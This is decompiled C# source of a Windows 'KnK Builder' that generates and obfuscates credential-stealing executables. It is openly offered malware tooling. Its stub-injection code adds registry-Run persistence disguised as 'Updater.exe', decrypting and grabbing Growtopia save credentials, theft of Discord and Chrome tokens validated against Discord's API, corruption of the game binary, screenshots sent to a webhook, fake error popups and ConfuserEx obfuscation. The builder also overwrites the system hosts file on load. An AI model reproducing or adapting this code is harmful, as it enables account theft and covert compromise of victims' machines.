using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using KnK_Builder.Properties;
using MetroFramework.Controls;

namespace KnK_Builder
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000258
		public Form1()
		{
			this.InitializeComponent();
			try
			{
				Directory.CreateDirectory("C:\\Tempo");
			}
			catch
			{
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002094 File Offset: 0x00000294
		private void Form1_Load(object sender, EventArgs e)
		{
			File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", this.hosts.Text);
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000020AB File Offset: 0x000002AB
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCJFdboR9co54kPeXqAgzIHQ");
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000020AB File Offset: 0x000002AB
		private void label2_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCJFdboR9co54kPeXqAgzIHQ");
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000020B8 File Offset: 0x000002B8
		public string ProcessStealer(string code)
		{
			string text = code;
			if (this.checkstart.Checked)
			{
				text = text.Replace("//startup", "             string tmp = Environment.ExpandEnvironmentVariables(\"%LOCALAPPDATA%\");\r\n            try { File.Copy(Assembly.GetExecutingAssembly().Location, tmp + \"\\\\Updater.exe\", true); } catch { }\r\n                RegistryKey rk = Registry.CurrentUser.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", true);\r\n                rk.SetValue(\"Updater\", tmp + \"\\\\Updater.exe\");");
			}
			if (this.hiddenstr.Checked)
			{
				text = text.Replace("//hiddenstr", "             string tmp = Environment.ExpandEnvironmentVariables(\"%LOCALAPPDATA%\");\r\n            try { File.Copy(Assembly.GetExecutingAssembly().Location, tmp + \"\\\\Update.exe\", true); } catch { }\r\n                RegistryKey rk = Registry.CurrentUser.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\", true);\r\n                rk.SetValue(\"Update\", tmp + \"\\\\Update.exe\");");
			}
			if (this.tracecheck.Checked)
			{
				string newValue = " static FileSystemWatcher watcher;\r\nprivate static void TraceSaveDat()\r\n        {\r\n            watcher = new FileSystemWatcher();\r\n            string save = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Growtopia\";\r\n            watcher.Path = save;\r\n                watcher.NotifyFilter = NotifyFilters.LastWrite;\r\n                watcher.Filter = \"*.dat\";\r\n                watcher.Changed += new FileSystemEventHandler(OnChanged);\r\n                watcher.EnableRaisingEvents = true;\r\n            }\r\n            private static void OnChanged(object source, FileSystemEventArgs e)\r\n            {\r\n                string temp = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n                string firstpass = File.ReadAllText(temp + \"\\\\result.txt\");\r\n                string[] splitted = firstpass.Split('|');\r\n                string gid = splitted[1];\r\n                string pas = splitted[0];\r\n                Process process = new Process();\r\n                ProcessStartInfo info = new ProcessStartInfo()\r\n                {\r\n                    WindowStyle = ProcessWindowStyle.Hidden,\r\n                    FileName = temp + \"\\\\savedecrypter.exe\",\r\n                };\r\n                process.StartInfo = info;\r\n                process.Start();\r\n                process.WaitForExit();\r\n                string readdecrypted = File.ReadAllText(temp + \"\\\\result.txt\");\r\n                string[] split = readdecrypted.Split('|');\r\n                string growid = split[1];\r\n                string pass = split[0];\r\n                if (gid != growid || pas != pass)\r\n                {\r\n                    File.Delete(temp + \"\\\\savedecrypter.exe\");\r\n                    watcher.EnableRaisingEvents = false;\r\n                    Program.Main();\r\n                }\r\n            }\r\n            ";
				string newValue2 = "            TraceSaveDat();\r\n            Thread.Sleep(Timeout.Infinite);";
				text = text.Replace("//tracereplace", newValue2);
				text = text.Replace("//tracecode", newValue);
			}
			else
			{
				string newValue3 = "                File.Delete(temp + \"\\\\savedecrypter.exe\");\r\n                File.Delete(temp + \"\\\\result.txt\"); ";
				text = text.Replace("//normalreplace", newValue3);
			}
			if (this.hidecheck.Checked)
			{
				string newValue4 = "            if(isHidden == false) \r\n            {\r\n                isHidden = true;\r\n                try { File.SetAttributes(Assembly.GetExecutingAssembly().Location, FileAttributes.Hidden); } catch { }\r\n            }";
				text = text.Replace("//hidelmao", newValue4);
			}
			if (this.tokensteal.Checked)
			{
				string newValue5 = "            WebToken();\r\n            DiscordGrab();";
				string newValue6 = "private static void WebToken()\r\n        {\r\n            string none = \"N/A\";\r\n            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\";\r\n                if (!Directory.Exists(discordPath))\r\n                {\r\n                    webtoken = none;\r\n                }\r\n                else\r\n                {\r\n                    string[] files = Directory.GetFiles(discordPath, \"*.ldb\");\r\n                    foreach (string tkn in files)\r\n                    {\r\n                        string readed = File.ReadAllText(tkn);\r\n                        if (readed.Contains(\"oken\"))\r\n                        {\r\n                            string regex = @\"[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}\";\r\n                            Match tokens = Regex.Match(readed, regex);\r\n                            string token = tokens.ToString();\r\n                            if (WorkingToken(token))\r\n                            {\r\n                                webtoken = token;\r\n                                break;\r\n                            }\r\n                            else\r\n                            {\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            private static void DiscordGrab()\r\n            {\r\n                string none = \"N/A\";\r\n                string discordpth = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \"\\\\discord\\\\Local Storage\\\\leveldb\\\\\";\r\n                if (!Directory.Exists(discordpth))\r\n                {\r\n                    discordtoken = none;\r\n                }\r\n                else\r\n                {\r\n                    string[] files = Directory.GetFiles(discordpth, \"*.ldb\");\r\n                    foreach (string tkn in files)\r\n                    {\r\n                        string readed = File.ReadAllText(tkn);\r\n                        if (readed.Contains(\"oken\"))\r\n                        {\r\n                            string regex = @\"[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}\";\r\n                            Match tokens = Regex.Match(readed, regex);\r\n                            string token = tokens.ToString();\r\n                            if (WorkingToken(token))\r\n                            {\r\n                                discordtoken = token;\r\n                                break;\r\n                            }\r\n                            else\r\n                            {\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            public static bool WorkingToken(string token)\r\n            {\r\n                try\r\n                {\r\n                    WebClient wc = new WebClient();\r\n                    wc.Headers.Add(HttpRequestHeader.Authorization, token);\r\n                    string lmao = wc.DownloadString(\"https://discordapp.com/api/users/@me\");\r\n                    return true;\r\n                }\r\n                catch\r\n                {\r\n                    return false;\r\n                }\r\n            }\r\n            ";
				text = text.Replace("//tokencall", newValue5);
				text = text.Replace("//tokencode", newValue6);
			}
			if (this.corruptgt.Checked)
			{
				string newValue7 = "        private static void ripgt()\r\n        {\r\n            if (gtrip == false)\r\n            {\r\n                string gtpath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Growtopia\\\\Growtopia.exe\";\r\n                byte[] growtopiabytes = File.ReadAllBytes(gtpath);\r\n                string bytes = Encoding.Default.GetString(growtopiabytes);\r\n                int index = bytes.IndexOf(\"a\");\r\n                bytes = bytes.Remove(index, 14).Insert(index, \"b\");\r\n                byte[] bytestowrite = Encoding.Default.GetBytes(bytes);\r\n                File.WriteAllBytes(gtpath, bytestowrite);\r\n                gtrip = true;\r\n            }\r\n        }";
				text = text.Replace("//gtripcode", newValue7);
				text = text.Replace("//gtripxd", "ripgt();");
			}
			if (this.screenshot.Checked)
			{
				string newValue8 = " Rectangle bounds = Screen.GetBounds(Point.Empty);\r\n                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))\r\n                {\r\n                    using (Graphics graphics = Graphics.FromImage(bitmap))\r\n                    {\r\n                        graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);\r\n                    }\r\n                    bitmap.Save(temp + \"\\\\\" + \"screen.jpg\", ImageFormat.Jpeg);\r\n                }\r\n                ";
				text = text.Replace("//extractscreen", newValue8);
				text = text.Replace("//screenattachment", "dcWeb.SendAttachment(temp + \"\\\\\" + \"screen.jpg\");");
				text = text.Replace("//deleteattachment", "File.Delete(temp + \"\\\\\" + \"screen.jpg\");");
			}
			if (this.fakemsg.Checked)
			{
				string newValue9 = "if(Error == false) \r\n            {\r\n                Error = true;\r\n                try { MessageBox.Show(\"//msg\", \"Error\", MessageBoxButtons.OK, MessageBoxIcon.Error); } catch { }\r\n            }";
				text = text.Replace("//errormessage", newValue9);
				text = text.Replace("//msg", this.fakemsgtext.Text);
			}
			return text;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002258 File Offset: 0x00000458
		public static string GenerateRandomString(int size)
		{
			byte[] array = new byte[4 * size];
			using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
			{
				rngcryptoServiceProvider.GetBytes(array);
			}
			StringBuilder stringBuilder = new StringBuilder(size);
			for (int i = 0; i < size; i++)
			{
				long num = (long)((ulong)BitConverter.ToUInt32(array, i * 4) % (ulong)((long)Form1.chars.Length));
				stringBuilder.Append(Form1.chars[(int)(checked((IntPtr)num))]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000022D8 File Offset: 0x000004D8
		private void compilebtn_Click(object sender, EventArgs e)
		{
			string str = Form1.GenerateRandomString(new Random().Next(10, 30));
			try
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Title = "Save your stealer.";
				saveFileDialog.FileName = "";
				saveFileDialog.Filter = "Executable files(*.exe)|*.exe";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					if (saveFileDialog.FileName == "" || saveFileDialog.FileName == " " || saveFileDialog.FileName == string.Empty)
					{
						MessageBox.Show("Invalid path", "Invalid path", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						string fileName = saveFileDialog.FileName;
						string text = this.txtwebhook.Text;
						string str2 = Environment.ExpandEnvironmentVariables("%TEMP%");
						Directory.CreateDirectory(str2 + "\\" + str);
						string text2 = str2 + "\\" + str;
						string text3 = Resources.Stub;
						text3 = this.ProcessStealer(text3);
						CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
						CompilerParameters compilerParameters = new CompilerParameters();
						compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
						compilerParameters.ReferencedAssemblies.Add("System.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Collections.Specialized.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
						compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Reflection.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
						compilerParameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Data.DataSetExtensions.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Xml.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Net.Http.dll");
						compilerParameters.ReferencedAssemblies.Add("mscorlib.dll");
						compilerParameters.GenerateExecutable = true;
						compilerParameters.OutputAssembly = text2 + "\\lmao.exe";
						compilerParameters.GenerateInMemory = false;
						CompilerParameters compilerParameters2 = compilerParameters;
						compilerParameters2.CompilerOptions += "/t:winexe";
						compilerParameters.TreatWarningsAsErrors = false;
						if (this.iconcheck.Checked)
						{
							CompilerParameters compilerParameters3 = compilerParameters;
							compilerParameters3.CompilerOptions = compilerParameters3.CompilerOptions + " /win32icon:\"" + this.icontxt.Text + "\"";
						}
						CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, new string[]
						{
							text3.Replace("**WEBHOOK**", text)
						});
						string[] files;
						if (compilerResults.Errors.Count > 0)
						{
							MessageBox.Show("Error!", "UNK-Builder V1");
							files = Directory.GetFiles(text2);
							for (int i = 0; i < files.Length; i++)
							{
								File.Delete(files[i]);
							}
							Directory.Delete(text2);
							/*using (IEnumerator enumerator = compilerResults.Errors.GetEnumerator())
							{
								while (enumerator.MoveNext())
								{
									object obj = enumerator.Current;
									MessageBox.Show(((CompilerError)obj).ToString(), "Error");
								}
								goto IL_4CD;
							}*/
						}
						string contents = string.Concat(new string[]
						{
							"<project outputDir=\"",
							text2,
							"\" baseDir=\"",
							text2,
							"\" xmlns=\"http://confuser.codeplex.com\">\r\n  <rule pattern =\"true\" inherit = \"false\"/>\r\n     <module path = \"lmao.exe\">\r\n        <rule pattern = \"true\" preset = \"maximum\" inherit = \"false\"/>\r\n           </module>\r\n         </project>"
						});
						File.WriteAllBytes(text2 + "\\probably.zip", Resources.probably);
						ZipFile.ExtractToDirectory(text2 + "\\probably.zip", text2 + "\\probably");
						File.WriteAllText(text2 + "\\probably\\probably\\probably.crproj", contents);
						Process process = new Process();
						ProcessStartInfo startInfo = new ProcessStartInfo
						{
							FileName = "cmd.exe",
							WindowStyle = ProcessWindowStyle.Hidden,
							Arguments = "/CConfuser.CLI probably.crproj",
							WorkingDirectory = text2 + "\\probably\\probably"
						};
						process.StartInfo = startInfo;
						process.Start();
						process.WaitForExit();
						files = Directory.GetFiles(text2 + "\\probably\\probably");
						for (int i = 0; i < files.Length; i++)
						{
							File.Delete(files[i]);
						}
						Directory.Delete(text2 + "\\probably\\probably");
						Directory.Delete(text2 + "\\probably");
						File.Delete(text2 + "\\probably.zip");
						if (!File.Exists(fileName))
						{
							File.Move(text2 + "\\lmao.exe", fileName);
						}
						else
						{
							File.Delete(fileName);
							File.Move(text2 + "\\lmao.exe", fileName);
						}
						Directory.Delete(text2);
						MessageBox.Show("Stealer is done!", "KnK-Builder v1.1", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
				IL_4CD:;
			}
			catch
			{
				string path = Environment.ExpandEnvironmentVariables("%TEMP%") + "\\" + str;
				string[] files = Directory.GetFiles(path);
				for (int i = 0; i < files.Length; i++)
				{
					File.Delete(files[i]);
				}
				Directory.Delete(path);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002830 File Offset: 0x00000A30
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", string.Empty);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002844 File Offset: 0x00000A44
		private void iconbutton_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Select your icon.";
			openFileDialog.FileName = "";
			openFileDialog.Filter = "Icon files(*.ico)|*.ico";
			openFileDialog.ShowDialog();
			if (!(openFileDialog.FileName == "") && !(openFileDialog.FileName == " "))
			{
				this.icontxt.Text = openFileDialog.FileName;
				this.pictureBox2.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(48, 48)).Handle);
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000028DD File Offset: 0x00000ADD
		private void button1_Click(object sender, EventArgs e)
		{
			base.Hide();
			Form2 form = new Form2();
			form.Closed += delegate(object s, EventArgs args)
			{
				base.Close();
			};
			form.Show();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002901 File Offset: 0x00000B01
		private void MetroTextBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002901 File Offset: 0x00000B01
		private void Fakemsgtext_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002901 File Offset: 0x00000B01
		private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002904 File Offset: 0x00000B04
		private void metroButton1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Bind Files";
			openFileDialog.Filter = "All files|*.*";
			openFileDialog.FileName = "";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				foreach (string text in openFileDialog.FileNames)
				{
					ListViewItem value = new ListViewItem(openFileDialog.FileNames);
					this.listView1.Items.Add(value);
				}
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002978 File Offset: 0x00000B78
		private void metroButton2_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				this.listView1.Items.Remove(this.listView1.SelectedItems[0]);
			}
		}

		// Token: 0x04000001 RID: 1
		internal static readonly char[] chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
	}
}
